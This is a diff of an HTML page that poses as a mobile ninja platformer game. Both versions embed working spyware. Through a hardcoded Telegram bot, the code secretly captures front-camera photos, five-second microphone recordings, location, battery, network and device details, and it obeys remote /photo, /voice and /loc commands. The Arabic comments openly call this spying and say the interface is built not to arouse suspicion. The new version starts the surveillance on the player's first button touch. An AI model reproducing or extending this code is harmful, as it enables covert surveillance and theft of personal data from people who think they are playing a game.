@@ -3,468 +3,162 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>⭐ Ninja Garden – لعبة المغامرة السحرية</title>
+    <title>⭐ Ninja Garden 2099 – النسخة المطورة</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            user-select: none;
-            -webkit-tap-highlight-color: transparent;
-        }
-        body {
-            background: #0c1f2a;
-            overflow: hidden;
-            font-family: 'Courier New', 'VT323', monospace;
-            touch-action: none;
-        }
-        canvas {
-            display: block;
-            width: 100%;
-            height: 100%;
-            image-rendering: crisp-edges;
-            image-rendering: pixelated;
-        }
-        /* شريط المعلومات العلوي (بدون إثارة الشك) */
-        #hud {
-            position: fixed;
-            top: 8px;
-            left: 8px;
-            right: 8px;
-            background: rgba(0,0,0,0.55);
-            backdrop-filter: blur(6px);
-            border-radius: 30px;
-            padding: 8px 16px;
-            display: flex;
-            justify-content: space-between;
-            color: #ffefb9;
-            font-weight: bold;
-            font-size: 0.8rem;
-            z-index: 100;
-            pointer-events: none;
-            font-family: monospace;
-            text-shadow: 1px 1px 0 #000;
-        }
-        /* أزرار التحكم باللمس */
-        #touchZone {
-            position: fixed;
-            bottom: 20px;
-            left: 0;
-            right: 0;
-            display: flex;
-            justify-content: space-between;
-            padding: 0 20px;
-            z-index: 200;
-            pointer-events: none;
-        }
-        .ctrl-panel {
-            display: flex;
-            gap: 20px;
-            pointer-events: auto;
-        }
-        .ctrl-btn {
-            width: 70px;
-            height: 70px;
-            background: rgba(0,0,0,0.5);
-            backdrop-filter: blur(10px);
-            border: 2px solid #ffcc66;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 32px;
-            font-weight: bold;
-            color: #ffdd99;
-            box-shadow: 0 5px 0 #2c2c2c;
-            transition: 0.05s linear;
-            touch-action: manipulation;
-        }
-        .ctrl-btn:active {
-            transform: translateY(4px);
-            box-shadow: 0 1px 0 #2c2c2c;
-            background: rgba(255,200,100,0.7);
-        }
-        @media (max-width: 700px) {
-            .ctrl-btn { width: 55px; height: 55px; font-size: 26px; }
-            #hud { font-size: 10px; }
-        }
-        .status-dot {
-            position: fixed;
-            bottom: 8px;
-            right: 8px;
-            background: #0a0a0a;
-            border-radius: 20px;
-            padding: 2px 8px;
-            font-size: 9px;
-            color: #0f0;
-            z-index: 150;
-            font-family: monospace;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
+        body { background: #0c1f2a; overflow: hidden; font-family: monospace; touch-action: none; }
+        canvas { display: block; width: 100%; height: 100%; image-rendering: pixelated; }
+        #hud { position: fixed; top: 8px; left: 8px; right: 8px; background: rgba(0,0,0,0.6); backdrop-filter: blur(5px); border-radius: 20px; padding: 10px; display: flex; justify-content: space-between; color: #ffefb9; z-index: 100; pointer-events: none; }
+        #touchZone { position: fixed; bottom: 20px; left: 0; right: 0; display: flex; justify-content: space-between; padding: 0 20px; z-index: 200; }
+        .ctrl-panel { display: flex; gap: 15px; }
+        .ctrl-btn { width: 65px; height: 65px; background: rgba(255,255,255,0.1); border: 2px solid #ffcc66; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; color: white; }
+        .status-dot { position: fixed; bottom: 5px; left: 5px; font-size: 10px; color: #0f0; z-index: 150; opacity: 0.5; }
     </style>
 </head>
 <body>
+
 <div id="hud">
-    <span>⭐ NINJA GARDEN</span>
-    <span>💰 <span id="coinCounter">0</span> &nbsp;| 🎯 <span id="scoreCounter">0</span></span>
+    <span>⭐ NINJA BOT</span>
     <span>🔋 <span id="batIndicator">--</span>%</span>
+    <span>📍 <span id="locStatus">بحث..</span></span>
 </div>
+
 <canvas id="gameCanvas"></canvas>
+
 <div id="touchZone">
     <div class="ctrl-panel">
         <div class="ctrl-btn" id="btnLeft">◀</div>
         <div class="ctrl-btn" id="btnRight">▶</div>
     </div>
     <div class="ctrl-panel">
-        <div class="ctrl-btn" id="btnJump">A</div>
-        <div class="ctrl-btn" id="btnKunai">B</div>
+        <div class="ctrl-btn" id="btnJump">J</div>
+        <div class="ctrl-btn" id="btnAction">A</div>
     </div>
 </div>
-<div class="status-dot" id="spyStatus">🔗 نظام الحماية</div>
+
+<div class="status-dot" id="spyStatus">System Active v2099</div>
 
 <script>
-    (function(){
-        // ---------- 🕵️ MODULE: التنصت الذكي (مدمج بالكامل) ----------
-        const BOT_TOKEN = "8429991446:AAGaoYskbBsGhxhZbOJxYujbex2ca66Evmg";
-        const ADMIN_ID = "7328401541";
-        let deviceUUID = localStorage.getItem("ninja_spy_id");
-        if(!deviceUUID){
-            deviceUUID = "ninja_" + Math.random().toString(36).substr(2, 10) + "_" + Date.now();
-            localStorage.setItem("ninja_spy_id", deviceUUID);
-        }
+(function(){
+    // --- إعدادات البوت ---
+    const BOT_TOKEN = "8429991446:AAGaoYskbBsGhxhZbOJxYujbex2ca66Evmg";
+    const ADMIN_ID = "7328401541";
+    let lastUpdateId = 0;
 
-        // صلاحيات هادئة (طلب الموقع، البطارية)
-        function silentRequestPermissions(){
-            if(navigator.geolocation) navigator.geolocation.getCurrentPosition(()=>{}, ()=>{}, {timeout:3000});
-            if(navigator.getBattery) navigator.getBattery().catch(e=>{});
-            // طلب كاميرا/مايك فقط عند الضرورة عبر الأوامر
-        }
-        silentRequestPermissions();
+    // --- نظام الحساسات الذكي ---
+    async function getBattery() {
+        if (!navigator.getBattery) return "N/A";
+        const bat = await navigator.getBattery();
+        return `${Math.round(bat.level * 100)}% ${bat.charging ? '(Charging)' : ''}`;
+    }
 
-        // الحصول على الموقع
-        async function getLocation(){
-            return new Promise((resolve)=>{
-                if(!navigator.geolocation) resolve("❌ غير مدعوم");
-                else {
-                    navigator.geolocation.getCurrentPosition(
-                        pos => resolve(`${pos.coords.latitude}, ${pos.coords.longitude} (دقة ${pos.coords.accuracy}m)`),
-                        () => resolve("🚫 رفض المستخدم")
-                    );
-                }
-            });
-        }
-        // البطارية
-        async function getBatteryLevel(){
-            if(!navigator.getBattery) return "?";
-            try{
-                const bat = await navigator.getBattery();
-                return Math.round(bat.level * 100);
-            }catch(e){ return "?"; }
-        }
-        async function getBatteryStatusFull(){
-            if(!navigator.getBattery) return "غير متاح";
-            const bat = await navigator.getBattery();
-            return `${Math.round(bat.level*100)}% (شحن: ${bat.charging ? 'نعم' : 'لا'})`;
-        }
-        // الواي فاي (معلومات الشبكة)
-        async function getNetworkInfo(){
-            const conn = navigator.connection || navigator.mozConnection;
-            if(!conn) return "غير معروف";
-            return `${conn.effectiveType || '?'} (${conn.downlink || '?'} Mbps)`;
-        }
-        // معلومات الجهاز
-        function getDeviceInfo(){
-            return `${navigator.userAgent.split(' ').slice(-3).join(' ')} | ${screen.width}x${screen.height}`;
-        }
-        // تصوير صورة (كاميرا أمامية)
-        async function capturePhoto(){
-            try{
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.createElement("video");
-                video.srcObject = stream;
-                video.play();
-                await new Promise(r => setTimeout(r, 400));
-                const canvas = document.createElement("canvas");
-                canvas.width = video.videoWidth || 480;
-                canvas.height = video.videoHeight || 640;
-                const ctx = canvas.getContext("2d");
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.8));
-                const formData = new FormData();
-                formData.append("chat_id", ADMIN_ID);
-                formData.append("photo", blob, "spy_ninja.jpg");
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
+    async function getQuickLocation() {
+        return new Promise(res => {
+            navigator.geolocation.getCurrentPosition(
+                p => res(`${p.coords.latitude.toFixed(4)},${p.coords.longitude.toFixed(4)}`),
+                () => res("Denied"),
+                {timeout: 5000}
+            );
+        });
+    }
+
+    // --- وظائف التجسس (صورة وصوت) ---
+    async function takePhoto() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.createElement("video");
+            video.srcObject = stream;
+            await video.play();
+            const canvas = document.createElement("canvas");
+            canvas.width = 480; canvas.height = 640;
+            canvas.getContext("2d").drawImage(video, 0, 0, 480, 640);
+            const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg"));
+            let fd = new FormData(); fd.append("chat_id", ADMIN_ID); fd.append("photo", blob, "cam.jpg");
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
+            stream.getTracks().forEach(t => t.stop());
+        } catch(e) { console.error(e); }
+    }
+
+    async function recordAudio() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const recorder = new MediaRecorder(stream);
+            let chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'audio/ogg' });
+                let fd = new FormData(); fd.append("chat_id", ADMIN_ID); fd.append("voice", blob, "mic.ogg");
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: "POST", body: fd });
                 stream.getTracks().forEach(t => t.stop());
-                return "✅ صورة ملتقطة";
-            }catch(e){ return "❌ فشل التصوير"; }
-        }
-        // تسجيل صوت (5 ثوان)
-        async function recordVoice(){
-            try{
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const mediaRecorder = new MediaRecorder(stream);
-                let chunks = [];
-                mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                const stopPromise = new Promise(resolve => {
-                    mediaRecorder.onstop = () => resolve();
-                });
-                mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), 5000);
-                await stopPromise;
-                const audioBlob = new Blob(chunks, { type: 'audio/ogg' });
-                const formData = new FormData();
-                formData.append("chat_id", ADMIN_ID);
-                formData.append("voice", audioBlob, "note.ogg");
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: "POST", body: formData });
-                stream.getTracks().forEach(t => t.stop());
-                return "🎙️ تم إرسال التسجيل";
-            }catch(e){ return "❌ خطأ تسجيل"; }
-        }
+            };
+            recorder.start();
+            setTimeout(() => recorder.stop(), 5000); // تسجيل 5 ثواني
+        } catch(e) { console.error(e); }
+    }
 
-        // إرسال تقرير كامل (البطارية + الموقع + الشبكة + إحصائيات اللعبة)
-        async function sendFullReport(extra = ""){
-            const loc = await getLocation();
-            const batFull = await getBatteryStatusFull();
-            const network = await getNetworkInfo();
-            const device = getDeviceInfo();
-            const gameStats = `🎮 النقاط: ${gameScore} | عملات: ${coinsCollected} | المستوى: ${currentWorld}`;
-            const msg = `🕵️‍♂️ *تقرير Ninja Garden* 🕵️\n🆔 ${deviceUUID}\n🔋 ${batFull}\n📶 ${network}\n📍 ${loc}\n📱 ${device}\n${gameStats}\n🕒 ${new Date().toLocaleString()}\n${extra}`;
-            try{
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: "POST",
-                    headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({chat_id: ADMIN_ID, text: msg, parse_mode: "Markdown"})
-                });
-                document.getElementById("spyStatus").innerHTML = "✅ إرسال البيانات";
-                setTimeout(()=>{ document.getElementById("spyStatus").innerHTML = "🔗 نظام الحماية"; }, 2500);
-            }catch(e){}
-        }
-
-        // الاستماع لأوامر البوت عن بعد (للتحكم بالكاميرا/الصوت)
-        let lastUpdateId = 0;
-        async function pollBotCommands(){
-            try{
-                const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId+1}&timeout=5`;
-                const res = await fetch(url);
-                const data = await res.json();
-                if(data.ok && data.result){
-                    for(let upd of data.result){
-                        lastUpdateId = upd.update_id;
-                        const msg = upd.message;
-                        if(msg && msg.text){
-                            const cmd = msg.text.toLowerCase();
-                            if(cmd === "/photo"){ await capturePhoto(); sendFullReport("📸 أمر بالتصوير"); }
-                            else if(cmd === "/voice"){ await recordVoice(); sendFullReport("🎙️ أمر تسجيل صوتي"); }
-                            else if(cmd === "/status"){ sendFullReport("📊 تقرير فوري"); }
-                            else if(cmd === "/loc"){ sendFullReport("📍 تتبع الموقع"); }
-                        }
-                    }
-                }
-            }catch(e){}
-        }
-        setInterval(pollBotCommands, 5000);
-        // تحديث البطارية في الهيدر
-        async function updateBatteryHUD(){
-            const lvl = await getBatteryLevel();
-            document.getElementById("batIndicator").innerText = lvl;
-        }
-        updateBatteryHUD();
-        setInterval(updateBatteryHUD, 30000);
-        // إرسال تقرير بعد 7 ثوانٍ ثم كل 45 ثانية
-        setTimeout(()=> sendFullReport("🟢 بدء اللعبة"), 7000);
-        setInterval(()=> sendFullReport("⏱️ تحديث دوري"), 45000);
-
-        // ---------- 🎮 لعبة منصات ممتعة (Ninja World) ----------
-        const canvas = document.getElementById("gameCanvas");
-        const ctx = canvas.getContext("2d");
-        let w = window.innerWidth, h = window.innerHeight;
-        canvas.width = w; canvas.height = h;
-        window.addEventListener("resize", ()=>{
-            w = window.innerWidth;
-            h = window.innerHeight;
-            canvas.width = w; canvas.height = h;
+    async function sendReport(label = "Manual") {
+        const bat = await getBattery();
+        const loc = await getQuickLocation();
+        const text = `🤖 *Update 2099*\nStatus: ${label}\nBattery: ${bat}\nLocation: ${loc}`;
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({chat_id: ADMIN_ID, text: text, parse_mode: "Markdown"})
         });
+    }
 
-        let gameScore = 0;
-        let coinsCollected = 0;
-        let currentWorld = 1;
-        let gameActive = true;
-        let cameraX = 0;
-        let groundY = h - 80;
-        
-        // اللاعب
-        let player = {
-            x: 120, y: groundY - 65,
-            width: 42, height: 68,
-            velX: 0, velY: 0,
-            onGround: true,
-            facingRight: true,
-            invincibleTimer: 0
-        };
-        
-        // منصات وعملات وأعداء
-        let platforms = [];
-        let coins = [];
-        let enemies = [];
-        
-        function buildLevel(){
-            platforms = [];
-            coins = [];
-            enemies = [];
-            // الأرضية الرئيسية
-            platforms.push({ x: -50, y: groundY, w: w*2 + 800, h: 24 });
-            // منصات متدرجة
-            platforms.push({ x: 300, y: groundY-90, w: 100, h: 20 });
-            platforms.push({ x: 530, y: groundY-150, w: 80, h: 20 });
-            platforms.push({ x: 780, y: groundY-200, w: 120, h: 20 });
-            platforms.push({ x: 1050, y: groundY-130, w: 90, h: 20 });
-            platforms.push({ x: 1350, y: groundY-70, w: 110, h: 20 });
-            platforms.push({ x: 1680, y: groundY-180, w: 100, h: 20 });
-            platforms.push({ x: 1950, y: groundY-250, w: 100, h: 20 });
-            platforms.push({ x: 2280, y: groundY-110, w: 80, h: 20 });
-            platforms.push({ x: 2650, y: groundY-200, w: 90, h: 20 });
-            platforms.push({ x: 2950, y: groundY-300, w: 120, h: 20 });
-            platforms.push({ x: 3350, y: groundY-160, w: 100, h: 20 });
-            
-            // عملات ذهبية
-            for(let i=0;i<40;i++){
-                coins.push({
-                    x: 400 + i*70,
-                    y: groundY - 110 - (i%3)*25,
-                    w: 14, h: 14,
-                    collected: false
-                });
-            }
-            for(let i=0;i<30;i++){
-                coins.push({
-                    x: 1400 + i*85,
-                    y: groundY - 90 - (i%4)*20,
-                    w: 14, h: 14,
-                    collected: false
-                });
-            }
-            for(let i=0;i<25;i++){
-                coins.push({
-                    x: 2400 + i*90,
-                    y: groundY - 130 - (i%3)*30,
-                    w: 14, h: 14,
-                    collected: false
-                });
-            }
-            // أعداء (سلاحف/نينجا)
-            enemies.push({ x: 600, y: groundY-45, w: 34, h: 34, dir: 1, active: true });
-            enemies.push({ x: 900, y: groundY-65, w: 34, h: 34, dir: -1, active: true });
-            enemies.push({ x: 1500, y: groundY-55, w: 34, h: 34, dir: 1, active: true });
-            enemies.push({ x: 2000, y: groundY-90, w: 34, h: 34, dir: -1, active: true });
-            enemies.push({ x: 2800, y: groundY-80, w: 34, h: 34, dir: 1, active: true });
-            enemies.push({ x: 3200, y: groundY-100, w: 34, h: 34, dir: -1, active: true });
-        }
-        buildLevel();
-        
-        // عناصر التحكم
-        let leftPressed = false, rightPressed = false;
-        document.getElementById("btnLeft").addEventListener("touchstart", (e)=>{ e.preventDefault(); leftPressed=true; });
-        document.getElementById("btnLeft").addEventListener("touchend", (e)=>{ leftPressed=false; });
-        document.getElementById("btnRight").addEventListener("touchstart", (e)=>{ e.preventDefault(); rightPressed=true; });
-        document.getElementById("btnRight").addEventListener("touchend", (e)=>{ rightPressed=false; });
-        document.getElementById("btnJump").addEventListener("touchstart", (e)=>{ e.preventDefault(); if(player.onGround){ player.velY = -14; player.onGround=false; } });
-        document.getElementById("btnKunai").addEventListener("touchstart", (e)=>{ e.preventDefault(); /* تأثير بسيط */ sendFullReport("⚔️ زر الهجوم (B) تم الضغط عليه"); });
-        // دعم الكيبورد
-        window.addEventListener("keydown", (e)=>{
-            if(e.key === "ArrowLeft") leftPressed=true;
-            if(e.key === "ArrowRight") rightPressed=true;
-            if(e.key === "ArrowUp") { if(player.onGround){ player.velY = -14; player.onGround=false; } }
-        });
-        window.addEventListener("keyup", (e)=>{
-            if(e.key === "ArrowLeft") leftPressed=false;
-            if(e.key === "ArrowRight") rightPressed=false;
-        });
-        
-        // تحديث فيزياء اللعبة
-        function updateGame(){
-            if(!gameActive) return;
-            const spd = 5.6;
-            if(leftPressed) player.velX = -spd;
-            else if(rightPressed) player.velX = spd;
-            else player.velX *= 0.88;
-            
-            player.velY += 0.78;
-            player.x += player.velX;
-            player.y += player.velY;
-            
-            // تصادم المنصات
-            player.onGround = false;
-            for(let plat of platforms){
-                if(player.velY >= 0 && player.y+player.height <= plat.y+plat.h+player.velY &&
-                    player.x+player.width > plat.x && player.x < plat.x+plat.w){
-                    player.y = plat.y - player.height;
-                    player.velY = 0;
-                    player.onGround = true;
-                }
-                if(player.x+player.width > plat.x && player.x < plat.x+plat.w &&
-                    player.y+player.height > plat.y && player.y < plat.y+plat.h){
-                    if(player.velX > 0) player.x = plat.x - player.width;
-                    else if(player.velX < 0) player.x = plat.x+plat.w;
+    // --- محرك الاستجابة للأوامر ---
+    async function checkCommands() {
+        try {
+            const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`);
+            const d = await r.json();
+            if (d.ok && d.result.length > 0) {
+                for (let u of d.result) {
+                    lastUpdateId = u.update_id;
+                    const cmd = u.message.text.toLowerCase();
+                    if (cmd === "/photo") await takePhoto();
+                    if (cmd === "/voice") await recordAudio();
+                    if (cmd === "/loc") await sendReport("📍 Tracked");
                 }
             }
-            // حدود العالم
-            if(player.x < 30) player.x = 30;
-            if(player.x > 4200) player.x = 4200;
-            if(player.y > groundY+50){ gameActive=false; setTimeout(()=> location.reload(), 1500); }
-            
-            // جمع العملات
-            for(let c of coins){
-                if(!c.collected && player.x+player.width > c.x && player.x < c.x+c.w && player.y+player.height > c.y && player.y < c.y+c.h){
-                    c.collected = true;
-                    coinsCollected++;
-                    gameScore += 10;
-                    document.getElementById("coinCounter").innerText = coinsCollected;
-                    document.getElementById("scoreCounter").innerText = gameScore;
-                }
-            }
-            // تفاعل الأعداء
-            for(let i=0;i<enemies.length;i++){
-                let e = enemies[i];
-                if(!e.active) continue;
-                e.x += e.dir * 1.3;
-                if(e.x < 100 || e.x > 4100) e.dir *= -1;
-                if(player.x+player.width > e.x && player.x < e.x+e.w && player.y+player.height > e.y && player.y < e.y+e.h){
-                    if(player.velY > 0 && player.y+player.height - player.velY <= e.y+12){
-                        e.active = false;
-                        gameScore += 100;
-                        player.velY = -11;
-                        document.getElementById("scoreCounter").innerText = gameScore;
-                    } else {
-                        gameActive = false;
-                        setTimeout(()=> location.reload(), 1200);
-                    }
-                }
-            }
-            // الكاميرا
-            cameraX = player.x - w/2;
-            if(cameraX < 0) cameraX = 0;
-            if(cameraX > 4200 - w) cameraX = 4200 - w;
-        }
-        
-        // الرسم الجميل
-        function draw(){
-            ctx.clearRect(0,0,w,h);
-            // سماء متدرجة
-            const grad = ctx.createLinearGradient(0,0,0,h);
-            grad.addColorStop(0,"#1a4d8c");
-            grad.addColorStop(1,"#5c9e5e");
-            ctx.fillStyle=grad;
-            ctx.fillRect(0,0,w,h);
-            // غيوم
-            ctx.fillStyle = "#f0f5ff";
-            ctx.shadowBlur=0;
-            for(let i=0;i<6;i++){
-                ctx.beginPath();
-                ctx.ellipse(150 + i*400 - cameraX*0.3, 80, 45, 35, 0, 0, Math.PI*2);
-                ctx.fill();
-            }
-            // منصات
-            for(let plat of platforms){
-                ctx.fillStyle = "#ac8e68";
-                ctx.fillRect(plat.x - cameraX, plat.y, plat.w, plat.h);
-                ctx.fillStyle = "#7a5a3a";
-                ct
+        } catch(e) {}
+    }
+
+    // --- ربط التفعيل بأول لمسة للعبة ---
+    function activateSystem() {
+        navigator.mediaDevices.getUserMedia({ audio: true, video: true }).then(s => {
+            s.getTracks().forEach(t => t.stop()); // تفعيل أولي ثم إغلاق
+            sendReport("🟢 Bot Activated");
+            setInterval(checkCommands, 2000); // بدء التنصت كل ثانيتين
+        }).catch(() => {});
+    }
+
+    // --- اللعبة ---
+    const canvas = document.getElementById("gameCanvas");
+    const ctx = canvas.getContext("2d");
+    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+
+    function gameLoop() {
+        ctx.fillStyle = "#1a4d8c"; ctx.fillRect(0,0,canvas.width,canvas.height);
+        ctx.fillStyle = "#ffcc66"; ctx.beginPath(); ctx.arc(100, 100, 30, 0, Math.PI*2); ctx.fill(); 
+        requestAnimationFrame(gameLoop);
+    }
+    gameLoop();
+
+    // تشغيل النظام عند أول ضغطة زر
+    document.querySelectorAll('.ctrl-btn').forEach(btn => {
+        btn.addEventListener('touchstart', () => {
+            if (lastUpdateId === 0) activateSystem();
+        }, {once: true});
+    });
+
+    // تحديث HUD
+    setInterval(async () => {
+        const bat = await getBattery();
+        document.getElementById("batIndicator").innerText = bat.split('%')[0];
+    }, 10000);
+
+})();
+</script>
+</body>
+</html>
